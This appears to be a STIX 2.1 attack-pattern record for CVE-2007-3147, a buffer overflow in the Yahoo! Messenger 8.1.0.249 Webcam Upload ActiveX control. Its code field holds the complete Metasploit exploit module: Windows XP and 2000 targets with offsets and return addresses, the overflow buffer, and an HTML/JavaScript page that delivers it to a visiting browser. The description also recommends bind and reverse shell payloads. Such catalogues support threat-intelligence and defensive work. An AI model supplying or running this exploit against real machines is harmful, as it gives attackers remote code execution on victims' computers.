{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--70582d63-6716-4f50-ab42-b7e572dd0df6",
    "created": "2024-08-14T16:45:20.34825Z",
    "modified": "2024-08-14T16:45:20.348254Z",
    "name": "Yahoo! Messenger 8.1.0.249 ActiveX Control Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in the Yahoo! Webcam Upload ActiveX Control (ywcupl.dll) provided by Yahoo! Messenger version 8.1.0.249. By sending an overly long string to the \"Server()\" method, and then calling the \"Send()\" method, an attacker may be able to execute arbitrary code. Using the payloads \"windows/shell_bind_tcp\" and \"windows/shell_reverse_tcp\" yield for the best results.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/yahoomessenger_server.rb",
            "external_id": "yahoomessenger_server.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-3147"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Yahoo! Messenger 8.1.0.249 ActiveX Control Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the Yahoo! Webcam Upload ActiveX\n        Control (ywcupl.dll) provided by Yahoo! Messenger version 8.1.0.249.\n        By sending an overly long string to the \"Server()\" method, and then calling\n        the \"Send()\" method, an attacker may be able to execute arbitrary code.\n        Using the payloads \"windows/shell_bind_tcp\" and \"windows/shell_reverse_tcp\"\n        yield for the best results.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'MC' ],\n      'References'     =>\n        [\n          [ 'CVE', '2007-3147' ],\n          [ 'OSVDB', '37082' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 800,\n          'BadChars'      => \"\\x00\\x09\\x0a\\x0d'\\\\\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP SP0/SP1 Pro English',     { 'Offset' => 1032, 'Ret' => 0x71aa32ad } ],\n          [ 'Windows 2000 Pro English All',       { 'Offset' => 1032, 'Ret' => 0x75022ac4 } ]\n        ],\n      'DisclosureDate' => '2007-06-05',\n      'DefaultTarget'  => 0))\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Randomize some things\n    vname\t= rand_text_alpha(rand(100) + 1)\n    strname\t= rand_text_alpha(rand(100) + 1)\n\n    # Set the exploit buffer\n    sploit =  rand_text_alpha(target['Offset'] - p.encoded.length) + p.encoded\n    sploit << Rex::Arch::X86.jmp_short(6) + make_nops(2) + [target.ret].pack('V')\n    sploit << [0xe8, -775].pack('CV') + rand_text_alpha(500)\n\n    # Build out the message\n    content = %Q|<html>\n<object classid='clsid:DCE2F8B1-A520-11D4-8FD0-00D0B7730277' id='#{vname}'></object>\n<script language='javascript'>\n#{strname} = new String('#{sploit}')\n#{vname}.server = #{strname}\n#{vname}.send()\n</script>\n</html>\n|\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-06-05",
    "x_mitre_platforms": [
        "win'"
    ]
}